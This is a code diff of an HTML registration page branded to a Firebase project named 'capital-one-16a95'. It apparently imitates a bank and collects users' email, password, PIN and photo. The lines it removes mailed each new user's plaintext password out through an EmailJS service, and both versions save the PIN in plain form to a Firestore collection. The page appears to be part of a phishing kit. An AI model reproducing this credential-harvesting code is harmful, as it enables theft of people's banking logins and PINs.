@@ -127,13 +127,14 @@
   </form>
 </div>
 
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js";
-  import { getAuth, createUserWithEmailAndPassword, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-auth.js";
-  import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-firestore.js";
-  import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-storage.js";
+<!-- ✅ Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js"></script>
 
-  // ONE project used everywhere
+<script>
+  // ✅ Firebase Config (same across all pages)
   const firebaseConfig = {
     apiKey: "AIzaSyCfQGrLEYcNfmYid8XvigP5ZXJh1RNoipM",
     authDomain: "capital-one-16a95.firebaseapp.com",
@@ -143,76 +144,57 @@
     appId: "1:1061937867911:web:347450d4e37ce73d0b5c22"
   };
 
-  const app = initializeApp(firebaseConfig);
-  const auth = getAuth(app);
-  const db = getFirestore(app);
-  const storage = getStorage(app);
+  // ✅ Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const auth = firebase.auth();
+  const db = firebase.firestore();
+  const storage = firebase.storage();
 
-  // (Optional) EmailJS – won’t block if not configured
-  const emailjsReady = new Promise((resolve) => {
-    const s = document.createElement("script");
-    s.src = "https://cdn.emailjs.com/dist/email.min.js";
-    s.onload = () => { try { emailjs.init("YOUR_EMAILJS_PUBLIC_KEY"); } catch(e){} resolve(true); };
-    s.onerror = () => resolve(false);
-    document.body.appendChild(s);
-  });
-
-  document.getElementById("bankForm").addEventListener("submit", async function(e) {
+  // ✅ Handle Registration
+  document.getElementById("bankForm").addEventListener("submit", async (e) => {
     e.preventDefault();
     const email = document.getElementById("email").value.trim();
     const password = document.getElementById("password").value;
     const pin = document.getElementById("pin").value;
 
     try {
-      // Create account (user will be signed in)
-      const { user } = await createUserWithEmailAndPassword(auth, email, password);
-      const uid = user.uid;
+      // Create user in Firebase Auth
+      const cred = await auth.createUserWithEmailAndPassword(email, password);
+      const uid = cred.user.uid;
 
-      // Fire verification email (non-blocking)
-      sendEmailVerification(user).catch(()=>{});
+      // Send email verification
+      cred.user.sendEmailVerification().catch(()=>{});
 
-      // Gather all form fields
-      const formData = new FormData(this);
+      // Collect form data
+      const formData = new FormData(e.target);
       const data = {};
       formData.forEach((v, k) => data[k] = v);
 
-      // Upload profile photo
+      // Upload profile picture
       let photoURL = "";
       const file = document.getElementById("profilePic").files[0];
       if (file) {
-        const storageRef = ref(storage, `profilePics/${uid}_${file.name}`);
-        await uploadBytes(storageRef, file);
-        photoURL = await getDownloadURL(storageRef);
+        const storageRef = storage.ref(`profilePics/${uid}_${file.name}`);
+        await storageRef.put(file);
+        photoURL = await storageRef.getDownloadURL();
       }
 
-      // Save user profile in Firestore (collection: registrations)
-      await setDoc(doc(db, "registrations", uid), {
+      // Save in Firestore
+      await db.collection("registrations").doc(uid).set({
         ...data,
-        email,         // ensure email stored
-        pin,           // stored for your PIN page if you add it later
+        email,
+        pin,
         photoURL,
-        balance: Number(data.balance) || 0, // default 0
-        createdAt: serverTimestamp()
+        balance: 0,
+        createdAt: firebase.firestore.FieldValue.serverTimestamp()
       });
 
-      // Try to send credential email (optional)
-      try {
-        await emailjsReady;
-        if (window.emailjs) {
-          await emailjs.send("service_afpof1g", "template_afpof1g", {
-            user_email: email,
-            user_password: password
-          });
-        }
-      } catch(_) {}
-
-      alert("✅ Registration successful! Redirecting to your dashboard…");
-      // user is already signed-in → go straight to dashboard
+      alert("✅ Registration successful! Redirecting...");
       window.location.href = "dashboard.html";
 
     } catch (err) {
       console.error(err);
-      alert("❌ " + (err?.message || "Registration failed"));
+      alert("❌ " + (err.message || "Registration failed"));
     }
   });
 </script>
